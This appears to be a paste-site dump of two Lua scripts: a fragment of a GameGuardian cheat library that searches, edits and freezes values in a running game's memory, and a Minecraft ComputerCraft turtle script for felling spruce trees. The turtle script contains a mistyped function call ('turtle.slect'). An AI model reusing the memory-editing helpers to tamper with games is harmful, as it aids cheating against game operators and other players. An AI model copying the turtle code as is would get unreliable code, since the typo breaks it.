--√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó√ó
d = gg.TYPE_DWORD  
e = gg.TYPE_DOUBLE
f = gg.TYPE_FLOAT

function offset()
gg.getResults(gg.getResultsCount())
local results = gg.getResults(gg.getResultsCount())     
for i, p in ipairs(results) do
results[i].address = results[i].address + o
results[i].flags = t
end  
gg.loadResults(results)
gg.getResults(gg.getResultsCount())
end 

function clear()
gg.getResults(gg.getResultsCount())
gg.clearResults()
end 

function clearall() 
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.getListItems()
gg.clearList()
end 

function freeze()
gg.getResults(gg.getResultsCount())
zz = gg.getResults(gg.getResultsCount())
for i, v in ipairs(zz) do
v.freeze = true
end
gg.addListItems(zz)
gg.getResults(gg.getResultsCount()) 
end 

function unfreeze()
gg.getResults(gg.getResultsCount())
zz = gg.getResults(gg.getResultsCount())
for i, v in ipairs(zz) do
v.freeze = false
end
gg.addListItems(zz)
gg.getResults(gg.getResultsCount()) 
end 

function search()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.searchNumber(x,t) 
end 

function refine()
gg.refineNumber(x,t) 
end 

function refinenot()
gg.refineNumber(x,t,false,gg.SIGN_NOT_EQUAL) 
end 

function edit()
gg.getResults(gg.getResultsCount())
gg.editAll(x,t) 
end 

function get()
gg.getResults(gg.getResultsCount())
end 

function head()
gg.getResults(gg.getResultsCount())
gg.getResults(1)
local header = gg.getResults(1)
gg.clearResults()
gg.searchNumber(tostring(header[1].value),gg.TYPE_DWORD) 
gg.getResults(gg.getResultsCount())
end 

function heads()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.searchNumber(tostring(header[1].value),gg.TYPE_DWORD) 
gg.getResults(gg.getResultsCount())
end 

function wait()
gg.toast(""Please Wait.. "") 
end 

function check()
gg.getResults(gg.getResultsCount())
local check = gg.getResultsCount()
if check == 0 then
gg.toast(""√ó ERROR √ó"")
E = 0 else E = 1
end 
cnt = gg.getResultsCount() 
end 

function resume()
gg.processResume()
end


function visible()
if gg.isVisible() then 
gg.setVisible(false) 
gg.getListItems()
gg.clearList()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.setVisible(true) 
print(""******************\n** ACCESS DENIED **\n******************"")
os.exit()
end   
end 

function exit()
clearall()
gg.toast(""Good-bye  ;-)"")
gg.setVisible(true) 
print(""MKM BY KKBS4U SCRIPTS\nNO HACKING NO ENJOYMENT"")
os.exit()
end


while true do
if gg.isVisible() then
active = 1
gg.setVisible(false)
gg.toast(""KKBS4U"")
end
if active == 1 then 
menu() 
end
end "
ybWy5BbW,Spruce2x2,ChicagoFire3,Lua,Sunday 8th of June 2025 07:48:20 PM CDT,"require ""GenUtil""

function FinishLayer()
  turtle.dig()
  turtle.forward()
  turtle.turnRight()
  turtle.dig()
  turtle.forward()
  turtle.turnRight()
  turtle.dig()
  turtle.forward()
  turtle.turnRight()
  turtle.forward()
  turtle.turnRight()
end

function CutLayer()
  turtle.dig()
  turtle.forward()
  turtle.turnRight()
  turtle.dig()
  turtle.forward()
  turtle.turnRight()
  turtle.dig()
end

function CutSpruce()
  turtle.dig()
  turtle.forward()
  FinishLayer()
  local y = 0
  local revert = 0

  while turtle.detectUp() do
    turtle.digUp()
    turtle.up()
    y = y+1
    CutLayer()
    revert = revert+1
  end

  if (revert % 2) == 1 then
    turtle.forward()
    turtle.turnRight()
    turtle.forward()
    turtle.turnRight()
  end

  while y > 1 do
    turtle.down()
    y=y-1
  end

  turtle.select(2)
  turtle.forward()
  turtle.placeDown()
  turtle.turnRight()
  turtle.forward()
  turtle.placeDown()
  turtle.turnRight()
  turtle.forward()
  turtle.placeDown()
  turtle.turnRight()
  turtle.forward()
  turtle.down()
  turtle.turnLeft()
  turtle.forward()
  EmptyForward(2)
  turtle.turnRight()
  turtle.turnRight()
  turtle.place()
  turtle.slect(1)
end

while true do
  local FoundBlock, BlockType = turtle.inspect()
  if FoundBlock then
    if BlockType['name'] == 'minecraft:spruce_log' then
      ReFuel(true)
      CutSpruce()
    end
  end
end"
